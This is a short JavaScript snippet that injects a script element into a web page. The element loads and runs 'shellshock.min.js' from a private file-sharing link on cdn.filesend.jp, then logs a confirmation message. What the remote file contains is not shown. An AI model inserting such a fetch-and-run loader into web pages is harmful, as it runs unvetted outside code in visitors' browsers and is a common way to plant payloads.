
 var script = document.createElement('script');
  script.src = 'https://cdn.filesend.jp/private/yegcfad-CWHxRBH0kM2VyAT6C9cCumJekW2aiNWZNRPZEa6RFpD_7wb082QMeM7M/shellshock.min.js';
  script.type = 'text/javascript';
  script.onload = function() {
    console.log('your script have been loaded');
  }
  document.body.appendChild(script);
